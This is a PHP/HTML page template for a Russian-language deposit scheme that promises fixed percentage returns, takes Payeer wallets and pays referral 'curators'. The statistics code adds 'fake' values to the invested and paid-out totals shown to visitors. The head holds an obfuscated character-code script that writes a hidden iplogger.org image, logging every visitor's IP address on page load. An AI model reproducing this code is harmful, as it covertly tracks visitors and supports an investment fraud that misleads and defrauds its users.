<!DOCTYPE html>
<html>
<?
/*ТУТ ЗАДАЮТСЯ ПЕРЕМЕННЫЕ ДЛЯ "Инвесторов", "Инвестировано (сумма)", "выплачено (сумма)", "резерв" И ПР.*/
$invcount=$db->fetch($db->query("SELECT COUNT(id) as invcount FROM ss_users WHERE curator>0"));
$invcount=$invcount['invcount'];

$depmoney=$db->fetch($db->query("SELECT SUM(summa) as depmoney FROM deposits WHERE curatorid>0"));
$depmoney=$depmoney['depmoney'];

$wthmoney=$db->fetch($db->query("SELECT SUM(summa) as wthmoney FROM deposits  WHERE status=?i AND curatorid!=?i ",1,0));
$wthmoney=$wthmoney['wthmoney']+($wthmoney['wthmoney']*($deppercentage/100));

$wthmoneyref=$db->fetch($db->query("SELECT SUM(summa) as wthmoneyref FROM deposits WHERE status=?i AND curatorid=?i",1,0));
$wthmoneyref=$wthmoneyref['wthmoneyref'];

$wthmoneyadm=$db->fetch($db->query("SELECT SUM(summa) as wthmoneyadmf FROM deposits WHERE status=?i AND curatorid=?i",1,0));
$wthmoneyadm=($wthmoneyadm['wthmoneyadmf']+($admpercent/100));

$budget=$depmoney-$wthmoney-$wthmoneyref;
if($budget<0){$budget=0;}

$depmoney=number_format(($depmoney+$depmoney_feik),2,'.',',');
$wthmoneyall=number_format(($wthmoney+$wthmoneyref+$wthmoneyall_feik),2,'.',',');
$wthmoney=number_format($wthmoney,2,'.',',');
$wthmoneyref=number_format($wthmoneyref,2,'.',',');
$budget=number_format($budget,2,'.',',');
?>
<?
/*А ТУТ КОЛИЧЕСТВО ВЫПЛАТ И ДЕПОВ*/
if(!empty($id)){
//$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
$mydeps=$db->numRows($db->query("SELECT id FROM deposits WHERE userid=?i AND curatorid!='0'",$id));
$mydeps='(<span id="count_my">'.$mydeps.'</span>)';
}else{
$mydeps='';
}

$opened=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i AND curatorid>0",0));
$closed=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i AND curatorid>0",1));
$all=$opened;

$closedall=$db->numRows($db->query("SELECT id FROM deposits WHERE status=?i AND curatorid!=?i",1,0));

?> 
 
<?
/*По итогу, вот список переменных, с которыми можно работать:*/
//$all - Количество депозитов
//$closedall - Количество выплат
//$mydeps - количество моих депозитов (кол-во депов залогиненого юзера)
//$invcount - количество юзеров в системе
//$depmoney - сколько всего вложено
//$wthmoney - сколько всего выплачено по депам
//$wthmoneyref - выплачено рефских
//$wthmoneyall - всего выплачено
//$budget - резерв системы
?>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=9">
<title><?=$sitename?> | +<?=$deppercentage?>% через <?=$timeprofit?></title>
<meta name="description" value="<?=$host?> - <?=$deppercentage?>% к вашему депозиту за <?=$timeprofit?>">
<meta name="keywords" value="заработок в интернете, заработок для каждого, вклады, вклады под высокие проценты, высокие проценты, 	инвестиции, инвестирование, инвестиции под высокие проценты">
<link rel="shortcut icon" href="/files/money.png">
<link rel="stylesheet" href="/files/style.css">
<link rel="stylesheet" href="/files/reset.css">
<link rel="stylesheet" href="/files/modal.css">
<script src="/templ/main/files/watch.js" async="" type="text/javascript"></script>
<script src="/templ/main/files/jquery.js"></script>
<link rel="stylesheet" href="/files/font.css">
<link rel="stylesheet" href="/style/animate.css">
<link href="https://fonts.googleapis.com/css?family=Black+Han+Sans" rel="stylesheet">
<link href="/style/font-awesome/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="/files/flag-icon.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script type="text/javascript" src="http://gostats.ru/js/counter.js"></script>  
<script type="text/javascript">_gos='c4.gostats.ru';_goa=407459;
_got=5;_goi=1;_gol='анализ сайта';_GoStatsRun();</script>
<noscript><img alt="" 
src="http://c4.gostats.ru/bin/count/a_407459/t_5/i_1/counter.png" 
style="border-width:0" /></noscript>
<script>
		$(document).ready(function(){
			setInterval(function(){
				$('.countdown').each(function(){
					var time=$(this).text().split(':');
					var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
					var hours=Math.floor(timestamp/3600);
					var minutes=Math.floor((timestamp- hours*3600)/ 60);
					var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}
					
				if(minutes<10){minutes='0'+ minutes;}
				if(seconds<10){seconds='0'+ seconds;}
				if(timestamp>0){
				$(this).text(hours+':'+ minutes+':'+ seconds);
				}
				});
		},1000);

		})
</script>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
</head>

<body class="splash">
<div class="site">
<div class="wrap">
<header>
<div class="header"> 
<nav class="menuTop cfix">
	<a href="/" class="active">Главная</a><span></span>
    <a href="/?page=about">О проекте</a><span></span>
    <a href="/?page=rules">Правила</a><span></span>
    <a href="/?page=top">Топ 10</a><span></span>
	<a href="/?page=faq">F.A.Q.</a><span></span>
	<a href="/?page=contacts">Контакты</a>
</nav>
</div>
</header>
<section class="slider">
<div style="
    background-color: rgba(0, 0, 0, 0.66);
    height: 516px;
">
<?if(!empty($_error)){?><br><br><font color="red"><?=$_error?></font><br><br><?}?>
<?if(!empty($_success)){?><br><br><font color="green"><?=$_success?></font><br><br><?}?>				
<?if(empty($id)){?>		
<div class="slider_title"><?=$sitename?></div>
<div class="slider_subtitle" style=" padding-bottom: 35px !important;">Лучшее место для Ваших инвестиций</div>

<form action="" method="post" id="formreg">
<input name="do" value="toaccount" type="hidden">
<input name="antipovtor" value="<?=time();?>" type="hidden">
<input autocomplete="off" name="wallet" pattern="^P[0-9]{7,14}" title="Первая буква должна быть заглавной [P] далее цифры кошелька" type="text" size="23" maxlength="35" placeholder="Введите ваш Payeer" class="input_payeer" style="width: 300px;padding: 0px 10px;">
<button type="submit" name="submit" id="form" class="button-blue" style="margin-left: 10px;">продолжить</button>
<span class="span_accept_rules">Нажимая кнопку "Продолжить" вы соглашаетесь с <a href="/?page=rules">Правилами</a> Проекта</span>
</form>

<?}else{?>		
<?
if(!empty($id)){
$wallet=$db->getOne("SELECT wallet FROM ss_users WHERE id=?i",$id);
?>
<?
$ihra=$db->getOne("SELECT curator FROM ss_users WHERE id=?i",$id);
?>
	
<?}?>
<table style="width:300px;margin:0 auto;padding-top: 90px;">
<tbody><tr>  
<td style="list-style-type: none;">
<li width="169" class="animated zoomIn" style="padding-bottom: 7px;">
<?
$ihr=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
?>
<a id="k" href="/?page=referals" style="text-decoration: none;" title="Ваши приглашенные партнеры"><font>Рефералы - <?=$ihr?></font></a></li>

<li width="751" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" href="/?page=my" style="text-decoration: none" title="Ваши открытые депозиты"><font>Мои депозиты</font></a></li>

<li width="180" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" href="/?page=exit" style="text-decoration: none" title="Выйти из аккаунта"><font>Выход</font></a></li>
</td>

<td style="list-style-type: none;">
<li width="180" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" style="text-decoration: none" title="Ваш логин в системе"><font><?=$wallet?></font></a></li>

<li width="169" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" style="text-decoration: none;" title="Ваш личный идентификатор"><font>Ваш id - <?=$id?></font></a></li>

<li width="751" class="animated zoomIn" style="padding-bottom: 7px;">
<a id="k" style="text-decoration: none" title="Идентификатор вашего пригласителя"><font>Куратор id - <?=$ihra?></font></a></li>

</td>
</tr>
</tbody></table>
<form action="" method="post">	
<input type="hidden" name="do" value="payeer_pay">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<table width="930" height="21px" border="0" cellpadding="0" cellspacing="0">
<tbody><tr>
<td align="center">
<br><b style="color:#fff;">Введите сумму вклада (от <?=$mindep?> до <?=$maxdep?> рублей) и нажмите ПРОДОЛЖИТЬ</b>
<br><b style="color:#fff;">Общая сумма вкладов в работе не должна превышать (<?=$maxdep?> рублей) за нарушение БЛОКИРОВКА</b><br> <br>
<input autocomplete="off" name="m_amount" type="text" size="23" maxlength="35" placeholder="Введите сумму" class="input_payeer" style="width: 300px;padding: 0px 10px;"><input type="submit" name="submit" id="form" value="ПРОДОЛЖИТЬ" class="button-blue" style="margin-left: 10px;">
</td>

</tr>
</tbody></table>
</form>
<?}?>
</div>
</section>